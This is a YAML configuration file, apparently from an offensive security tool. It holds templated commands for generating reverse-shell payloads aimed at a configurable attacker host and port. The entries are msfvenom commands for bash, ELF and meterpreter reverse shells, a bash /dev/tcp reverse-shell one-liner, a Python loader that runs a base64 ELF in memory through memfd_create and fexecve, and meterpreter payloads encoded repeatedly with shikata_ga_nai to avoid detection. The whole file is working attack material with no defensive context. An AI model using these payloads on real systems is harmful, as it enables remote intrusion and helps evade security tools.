reverse_shell_raw: >-
    venom=`msfvenom -p cmd/unix/reverse_bash LHOST={settings.host_ip} LPORT={settings.handlerport} -f raw 2> /dev/null` 
    && printf '#!/bin/bash\n%s\n' "$venom" 
reverse_shell_bash: >-
    printf '%b\n%b\n' "#!/bin/bash" "/bin/bash -i > /dev/tcp/{settings.host_ip}/{settings.handlerport} 2>&1 0>&1" 
reverse_shell_elf: >-
    msfvenom -p linux/x86/shell_reverse_tcp LHOST={settings.host_ip} LPORT={settings.handlerport} -f elf 
reverse_shell_elf_python: >-
    venom=`msfvenom -p linux/x86/shell_reverse_tcp LHOST={settings.host_ip} LPORT={settings.handlerport} -f elf 2> /dev/null | base64 | tr -d "\n"` 
    && printf '%s\n%s\n%s\n%s\n%s%s%s\n%s\n%s\n' 
    "import ctypes, os, urllib2, base64;" 
    "libc = ctypes.CDLL(None);" 
    "argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]));" 
    "syscall = libc.syscall;"
    "fexecve = libc.fexecve;content = base64.b64decode(\"" "$venom" "\");"
    "fd = syscall(319, \"\", 1);"
    "os.write(fd, content);fexecve(fd, argv, argv)"
meterpreter: >-
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={settings.host_ip} LPORT={settings.handlerport} -f elf 
meterpreter_shi: >-
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={settings.host_ip} LPORT={settings.handlerport} 
    -e x86/shikata_ga_nai -f elf 
meterpreter_shi_iter: >-
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={settings.host_ip} LPORT={settings.handlerport} 
    -e x86/shikata_ga_nai -i 17 -f elf

